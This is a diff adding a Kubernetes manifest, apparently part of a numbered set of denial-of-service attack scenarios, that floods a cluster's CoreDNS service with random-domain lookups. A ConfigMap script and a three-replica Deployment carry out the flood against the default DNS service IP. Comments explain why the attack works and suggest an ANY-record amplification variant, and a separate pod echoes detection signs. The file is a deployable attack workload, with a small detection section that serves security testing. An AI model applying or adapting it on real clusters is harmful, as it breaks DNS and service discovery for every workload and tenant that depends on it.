@@ -1,0 +1,194 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: dns-amplification
+---
+# DoS Attack #3: CoreDNS Amplification Attack
+# Description: Pod floods CoreDNS with recursive DNS queries,
+# causing resolution timeouts and cluster communication failure.
+#
+# Attack Flow:
+# 1. Target: CoreDNS pods in kube-system namespace
+# 2. Attack: Send recursive DNS query loads
+# 3. Load Query: query -> resolver -> resolver -> ... (chain)
+# 4. Impact:
+#    - CoreDNS CPU usage spikes
+#    - Pod can't resolve DNS names
+#    - Service discovery breaks
+#    - Applications timeout waiting for DNS
+#    - Cluster communication paralyzed
+# 5. Simple attack: Query invalid domains repeatedly (no caching)
+#
+# Why Effective:
+# - CoreDNS is single point for DNS in cluster
+# - No ratelimiting by default
+# - Recursive queries expensive (must follow chain)
+# - Cache misses for invalid domains
+# - All pods depend on it
+#
+# Detection Points:
+# - CoreDNS pod CPU spike to 100%
+# - DNS query spike from single pod to CoreDNS
+# - High number of NXDOMAIN responses
+# - Pod DNS resolution timeouts
+# - CoreDNS pod restarts due to OOM/CPU limits
+# - Network traffic to port 53 spike
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: dns-attack-script
+  namespace: dns-amplification
+data:
+  attack: |
+    #!/bin/bash
+    # DNS Amplification Attack
+    
+    echo "[*] DNS Amplification Attack"
+    echo "[*] Target: CoreDNS service at 10.96.0.10:53"
+    
+    # Query non-existent domains repeatedly
+    # Each query misses cache and requires full resolution
+    for i in {1..1000}; do
+      DOMAIN="invalid-non-existent-domain-$RANDOM-$RANDOM.com"
+      
+      # Send query and discard response
+      nslookup $DOMAIN 10.96.0.10 > /dev/null 2>&1 &
+      
+      # Or use dig for recursive queries
+      # dig @10.96.0.10 +recurse $DOMAIN > /dev/null &
+    done
+    
+    echo "[*] Queries sent, waiting for responses..."
+    wait
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dns-attacker
+  namespace: dns-amplification
+  labels:
+    app: dns-dos
+spec:
+  replicas: 3  # Multiple pods for more impact
+  selector:
+    matchLabels:
+      app: dns-dos
+  template:
+    metadata:
+      labels:
+        app: dns-dos
+    spec:
+      containers:
+      - name: attacker
+        image: curlimages/curl:latest # Has nslookup/dig
+        command:
+        - sh
+        - -c
+        - |
+          echo "[*] DNS Amplification Attacker (pod $(hostname))"
+          
+          echo "[*] Identifying CoreDNS service..."
+          # CoreDNS typically at: kube-dns.kube-system.svc.cluster.local
+          COREDNS_IP="10.96.0.10"  # Default K8s DNS service IP
+          
+          echo "[*] Starting DNS query flood..."
+          
+          for i in {1..5000}; do
+            # Generate random domain (won't cache)
+            DOMAIN="invalid-$RANDOM-$i.test.local"
+            
+            # Query CoreDNS repeatedly
+            nslookup $DOMAIN $COREDNS_IP > /dev/null 2>&1 &
+            
+            # To amplify: also ask for ANY records
+            # nslookup -query=ANY $DOMAIN $COREDNS_IP > /dev/null 2>&1 &
+          done
+          
+          echo "[+] DNS query flood sent"
+          
+          # Keep sending
+          sleep 36000
+
+---
+# Monitoring DNS health
+apiVersion: v1
+kind: Pod
+metadata:
+  name: dns-health-check
+  namespace: dns-amplification
+  labels:
+    tool: health-check
+spec:
+  serviceAccountName: dns-checker-sa
+  containers:
+  - name: checker
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== DNS Amplification Detection ==="
+      
+      echo "[*] Checking CoreDNS health..."
+      
+      echo "[*] Red flags:"
+      echo "  • CoreDNS pod CPU > 80%"
+      echo "  • DNS resolution latency > 100ms (normally <10ms)"
+      echo "  • Timeout errors resolving service DNS"
+      echo "  • CoreDNS pod restarts"
+      echo "  • High number of NXDOMAIN responses in logs"
+      
+      echo ""
+      echo "[*] Query metrics:"
+      # kubectl top pods -n kube-system | grep coredns
+      # kubectl logs -n kube-system -l k8s-app=kube-dns | tail -20
+      
+      echo ""
+      echo "[*] In-cluster DNS resolution test:"
+      
+      # Test DNS resolution
+      nslookup kubernetes.default 2>/dev/null | head -5 || echo "DNS test failed"
+      
+      echo ""
+      echo "[*] If DNS is slow, cluster is severely impacted:"
+      echo "  - Services can't be discovered"
+      echo "  - Pods fail to start (can't download images)"
+      echo "  - Health checks fail"
+      echo "  - Communication breakdown"
+      
+      sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: dns-checker-sa
+  namespace: dns-amplification
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: dns-checker-role
+  namespace: dns-amplification
+rules:
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: dns-checker-binding
+  namespace: dns-amplification
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: dns-checker-role
+subjects:
+- kind: ServiceAccount
+  name: dns-checker-sa
+  namespace: dns-amplification
